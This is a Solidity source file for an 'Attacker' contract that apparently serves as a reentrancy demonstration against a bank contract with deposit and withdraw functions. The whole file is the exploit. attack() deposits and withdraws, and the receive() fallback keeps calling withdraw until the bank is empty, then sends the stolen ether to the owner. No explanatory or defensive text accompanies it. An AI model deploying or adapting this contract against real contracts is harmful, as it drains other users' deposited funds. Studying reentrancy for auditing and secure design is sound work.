pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";


/// @dev I would be using this interface to ineract with 
interface IBank {
  function deposit() external payable;
  function withdraw() external;
}

/// @author developeruche
contract Attacker is Ownable {
  /// @dev the bank contracts interface is immplimented here
  IBank public immutable bankContract;

  constructor(address bankContractAddress) {
    bankContract = IBank(bankContractAddress);
  }

  /// @dev this is the start of the attack
  function attack() external payable onlyOwner {
    bankContract.deposit{ value: msg.value }();
    bankContract.withdraw();
  }

  /// @dev this is the base in how the attack continues
  receive() external payable {
    if (address(bankContract).balance > 0) {
      bankContract.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }

  function getContractBalance() public view returns(uint ) {
      return address(this).balance;
  }
}